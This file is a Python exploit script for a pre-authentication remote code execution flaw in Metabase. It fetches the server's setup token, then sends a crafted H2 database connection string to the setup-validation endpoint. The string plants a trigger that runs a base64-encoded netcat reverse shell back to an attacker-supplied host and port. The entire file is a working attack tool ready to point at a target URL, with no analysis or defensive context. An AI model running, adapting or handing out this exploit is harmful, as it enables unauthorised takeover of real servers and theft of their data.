import requests
import argparse
import base64
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse


setup_token=""

def getSetupToken(ip_address):
    endpoint = "/api/session/properties"
    url = f"{ip_address}{endpoint}"
    try:
        print(f"[*] Fetching setup token from {url}...")
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            data = response.json()
            setup_token = data.get("setup-token")
            metabase_version = data.get("version", {}).get("tag")

            if setup_token is None:
                print(f"[-] Setup token not found or is null for IP: {ip_address}\n")
            else:
                print(f"[+] Setup Token: {setup_token}")
                print(f"[+] Version: {metabase_version}")

            return setup_token
    except requests.exceptions.RequestException as e:
        print(f"[-] Exception occurred: {e}")
        print(f"[-] Failed to connect to {ip_address}.\n")

def b64(command):
    command = command.strip()
    encoded = base64.b64encode(command.encode('ascii')).decode()
    equal_count = encoded.count('=')

    if equal_count >= 1:
        encoded = base64.b64encode(f'{command + " " * equal_count}'.encode('ascii')).decode()
    
    return encoded

parser = argparse.ArgumentParser('Metabase Pre-Auth RCE')

parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
parser.add_argument('-lhost', '--lhost', type=str, required=True, help='Input lhost')
parser.add_argument('-lport', '--lport', type=int, required=True, help='Input lport')

args = parser.parse_args()

url = f"{args.url}/api/setup/validate"

headers = {'Content-Type': 'application/json'}

command = b64("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc " + args.lhost + " " + str(args.lport) + " >/tmp/f")

print(command)
setup_token=getSetupToken(args.url)
print(setup_token)

data = {
    "token": setup_token,
    "details":
    {
        "is_on_demand": "false",
        "is_full_sync": "false",
        "is_sample": "false",
        "cache_ttl": "null",
        "refingerprint": "false",
        "auto_run_queries": "true",
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo," + command + "}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": "false",
            "ssl": "true"
        },
        "name": "x",
        "engine": "h2"
    }
}

response = requests.post(url, headers=headers, json=data)

print("[+] Payload sent!\n\nNOTE: Make sure to open a listener on the specifed port and address if you entered a reverse shell command.\n")